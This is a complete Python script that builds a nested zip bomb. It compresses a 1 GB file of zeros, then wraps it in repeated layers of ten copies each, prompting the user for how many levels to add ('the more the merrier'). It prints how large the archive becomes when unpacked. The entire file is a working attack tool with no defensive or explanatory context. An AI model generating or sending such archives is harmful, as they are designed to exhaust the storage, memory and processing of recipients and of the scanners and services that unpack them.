import zlib
import zipfile
import shutil
import os
import sys
import time


def fileSize(filename):
    st = os.stat(filename)
    return st.st_size


def makeTempFile(filename, size):
    with open(filename, 'w') as cache:
        for i in range(1024):
            cache.write((size * 1024 * 1024) * '0')


def filenameNoExt(name):
    return name[:name.rfind('.')]


def fileExt(name):
    return name[name.rfind('.') + 1:]


def compressFile(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()


def copyandcompress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (filenameNoExt(infile), i, fileExt(infile))
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()


def makeBomb(levels, fileName):
    # Set Variables
    n_levels = levels
    out_zip_file = fileName
    dummy_name = 'cache.txt'
    start_time = time.time()
    # Start
    makeTempFile(dummy_name, 1)
    level_1_zip = '1.zip'
    print('compressing...\n')
    compressFile(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size = 1
    print('starting layers...\n')
    for i in range(1, n_levels + 1):
        copyandcompress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size *= 10
        os.remove('%d.zip' % i)
        print('layer ' + str(i) + ' done')
    print('\n')
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (n_levels + 1), out_zip_file)
    end_time = time.time()
    print('Compressed File Size: %.2f KB' % (fileSize(out_zip_file) / 1024.0))
    print('Size After Decompression: %d GB' % decompressed_size)
    print('Generation Time: %.2fs' % (end_time - start_time))
    return out_zip_file


level = str(input('level: the more the merrier'))
print('\n')
name = str(input('desired file name-EX: [name].zip'))
t1 = name.split(".")
t2 = len(t1)
if (t2 == 1):
    name = name + ".zip"
    print("\n you did not enter a .zip file, so we added it for you\n")
makeBomb(int(level), name)

# if __name__ == '__main__':
#	if len(sys.argv) < 3:
#		print ('Usage:\n')
#		print (' zipbomb.py n_levels out_zip_file')
#		exit()
